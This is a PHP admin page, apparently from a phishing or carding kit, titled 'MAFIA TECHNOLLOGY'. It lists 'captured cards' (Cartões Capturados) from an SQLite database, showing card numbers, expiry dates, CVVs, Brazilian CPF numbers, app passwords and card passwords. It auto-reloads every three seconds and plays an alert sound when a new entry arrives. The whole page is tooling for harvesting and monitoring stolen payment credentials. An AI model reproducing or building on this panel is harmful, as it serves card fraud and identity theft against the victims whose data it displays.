<?php
$sqlite = "sqlite:../login/db.db";
$pdo = new PDO($sqlite);

if (!isset($_COOKIE['login'])) {
	header("location:login.php");
}
?>
<!DOCTYPE html>
<html>
<head>
	<title>MAFIA TECHNOLLOGY</title>
	<link rel="stylesheet" type="text/css" href="css/index.css">
	<link rel="stylesheet" type="text/css" href="font-awesome-4.7.0/css/font-awesome.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
	<meta charset="utf-8">
	<script type="text/javascript">
		$(document).ready(function() {
			$("td.status").each(function(index, el) {
				if ($(this).html() == "Nova") {
					var audio = new Audio('new-info1.mp3');
					audio.play();
					return false;
				}
			});
			setTimeout(function() {
				location.reload();
			}, 3000);
		});
	</script>
</head>
<body>

	<?php require 'header.php'; ?>


	<div class="clientes">
		<div class="container">
			<div class="header">
				<i class="fa fa-users" aria-hidden="true"></i><p>Cartões Capturados</p>
			</div>
			<table>
				<tr>
					<th>STATUS</th>
					<th>CC</th>
					<th>VALIDADE</th>
					<th>CVV</th>
					<th>CPF</th>
					<th>SENHA APP</th>
					<th>SENHA CC</th>
					<th>OPÇÕES</th>
				</tr>

				<?php

$execucao = $pdo->prepare("select * from cc");

$execucao->execute();
				?>

<?php
            while ($row = $execucao->fetch()) {
                echo "
                    <tr class='user'>
					<td class='status1'>".$row['status']."</td>
					<td>".$row["cc"]."</td>
					<td>".$row["validade"]."</td>
                	<td>".$row["cvv"]."</td>
					<td>".$row["cpf"]."</td>
					<td>".$row["senha_app"]."</td>
					<td>".$row["senha_cc"]."</td>
					<td><a href='./processar/remover.php?id=".$row["id"]."'><button>APAGAR</button></a></td>
                    </tr>
                ";
            }
        ?>

			</table>
		</div>
	</div>



	<?php require 'footer.php'; ?>

</body>
</html>